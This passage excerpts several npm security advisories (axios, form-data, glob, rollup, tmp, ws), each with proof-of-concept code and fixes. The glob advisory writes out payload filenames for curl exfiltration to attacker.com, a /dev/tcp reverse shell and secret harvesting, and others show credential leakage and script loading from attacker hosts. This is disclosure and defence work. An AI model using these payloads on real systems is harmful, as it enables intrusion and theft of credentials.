      "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
      "details": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",

      "summary": "form-data uses unsafe random function in form-data for choosing boundary",
      "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",

      "summary": "Axios is vulnerable to DoS attack through lack of data size check",
      "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body.

If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",

      "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
      "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",

      "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",

      "details": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",

Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
